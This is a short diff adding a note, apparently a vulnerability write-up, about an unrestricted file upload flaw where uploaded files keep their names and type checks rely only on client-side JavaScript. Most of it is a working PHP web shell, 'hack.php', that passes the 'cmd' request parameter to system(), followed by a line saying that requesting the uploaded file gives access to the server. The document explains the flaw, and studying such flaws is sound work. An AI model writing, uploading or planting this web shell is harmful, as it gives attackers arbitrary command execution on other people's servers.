@@ -1,0 +1,20 @@
+
+
+Hacker upload code  hack.php
+
+upload file not renamed when upload. This is the dangerous
+File type checking javascript is disabled
+
+<?php
+  if(isset($_REQUEST['cmd'])) {
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+  } else {
+    echo "What is your bidding?";
+  }
+?>
+A simple web shell, which when executed by PHP, will run any command passed in the "cmd" parameter.
+
+
+when hacker executed like www.bread.com/hack.php it will get access to the server.
+
